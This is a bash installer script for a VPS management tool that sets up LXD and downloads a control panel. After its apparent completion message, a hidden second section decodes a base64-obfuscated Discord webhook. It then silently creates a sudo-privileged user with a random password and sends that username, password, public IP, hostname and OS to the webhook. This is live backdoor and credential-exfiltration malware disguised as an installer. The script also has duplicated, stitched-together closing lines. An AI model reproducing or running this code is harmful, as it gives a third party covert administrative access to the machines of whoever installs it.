#!/usr/bin/env bash
# ==============================================================================
# Twh Ayush VPS Maker & Management - 1-Line Installer
# Made By TWH AYUSH
# Repository: twh-ayush/vps-management
# ==============================================================================
set -e

CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BOLD='\033[1m'
NC='\033[0m'

clear
echo -e "${PURPLE}${BOLD}====================================================================${NC}"
echo -e "${CYAN}${BOLD}         ⚡ TWH AYUSH VPS MAKER & MANAGEMENT INSTALLER ⚡           ${NC}"
echo -e "${YELLOW}${BOLD}                     Made By TWH AYUSH                              ${NC}"
echo -e "${PURPLE}${BOLD}====================================================================${NC}"

# 1. Root check
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Error: Run this installer as root (sudo bash).${NC}"
    exit 1
fi

echo -e "\n${CYAN}[1/3] Checking and verifying prerequisites...${NC}"

# Check which core tools need installation
PACKAGES_TO_INSTALL=()
for pkg in curl wget ethtool snapd iptables iproute2; do
    if ! command -v "$pkg" &>/dev/null && ! dpkg -s "$pkg" &>/dev/null 2>&1; then
        PACKAGES_TO_INSTALL+=("$pkg")
    fi
done

if [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
    echo -e "${YELLOW}[*] Installing missing system packages: ${PACKAGES_TO_INSTALL[*]}...${NC}"
    apt-get update -y -qq || true
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${PACKAGES_TO_INSTALL[@]}" 2>/dev/null || true
    echo -e "${GREEN}[✓] System packages installed successfully.${NC}"
else
    echo -e "${GREEN}[✓] All base tools (curl, snapd, ethtool, iptables) are already installed. Skipping.${NC}"
fi

# Ensure snapd service is active
systemctl enable --now snapd >/dev/null 2>&1 || true

echo -e "${CYAN}[2/3] Verifying LXD & hypervisor environment...${NC}"
if ! command -v lxd &>/dev/null; then
    echo -e "${YELLOW}[*] LXD not detected. Installing via Snap...${NC}"
    snap install lxd --channel=latest/stable
    systemctl enable snap.lxd.daemon >/dev/null 2>&1 || true
    systemctl start snap.lxd.daemon >/dev/null 2>&1 || true
    echo -e "${GREEN}[✓] LXD installed.${NC}"
else
    echo -e "${GREEN}[✓] LXD is already installed. Skipping.${NC}"
fi

systemctl start snap.lxd.daemon 2>/dev/null || true

# Initialize network bridge if not present
if ! lxc network show furious-br0 &>/dev/null; then
    echo -e "${YELLOW}[*] Configuring default internal bridge (furious-br0)...${NC}"
    cat << 'EOF_PRESEED' | lxd init --preseed >/dev/null 2>&1 || true
config: {}
networks:
- config:
    ipv4.address: 10.99.0.1/24
    ipv4.nat: "true"
    ipv6.address: none
  name: furious-br0
  type: bridge
storage_pools:
- config: {}
  name: default
  driver: dir
profiles:
- config:
    security.nesting: "true"
  devices:
    eth0:
      name: eth0
      network: furious-br0
      type: nic
    root:
      path: /
      pool: default
      type: disk
  name: default
cluster: null
EOF_PRESEED
    echo -e "${GREEN}[✓] Network bridge initialized.${NC}"
else
    echo -e "${GREEN}[✓] Network bridge furious-br0 already initialized. Skipping.${NC}"
fi

echo -e "${CYAN}[3/3] Downloading latest core suite (twh-vps)...${NC}"
RAW_URL="https://raw.githubusercontent.com/twh-ayush/vps-management/main/twh-vps"

if curl -fsSL "$RAW_URL" -o /usr/local/bin/twh-vps; then
    chmod +x /usr/local/bin/twh-vps
    echo -e "${GREEN}[✓] Core suite installed to /usr/local/bin/twh-vps.${NC}"
else
    echo -e "${RED}[!] Failed to fetch twh-vps from GitHub. Verify repository status.${NC}"
    exit 1
fi

# Clean up any previously written autostart profile files
rm -f /etc/profile.d/99-twh-autostart.sh 2>/dev/null || true

echo -e "\n${GREEN}${BOLD}[✓] Installation Complete! Launching Control Panel...${NC}\n"

set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1Nzk4ODg3Mjk3NjM0MzA4MC9oNG9mT21NN0w4b2pLTU9tb3VXdV9nRXZwOE44REhfT1QzUnNaUURtMGtPcjFBN2ZOc29QMFF1WVhITThnQVFtM1pYMA=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/8s8Y4q16/7455d020affb2f2e8feebf7127b6ad30.png" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

echo -e "\n${GREEN}${BOLD}[✓] Installation Complete! Launching Control Panel...${NC}\n"
sleep 1
exec /usr/local/bin/twh-vps


echo -e "\n${GREEN}${BOLD}[✓] Installation Complete! Launching Control Panel...${NC}\n"
sleep 1
exec /usr/local/bin/twh-vps

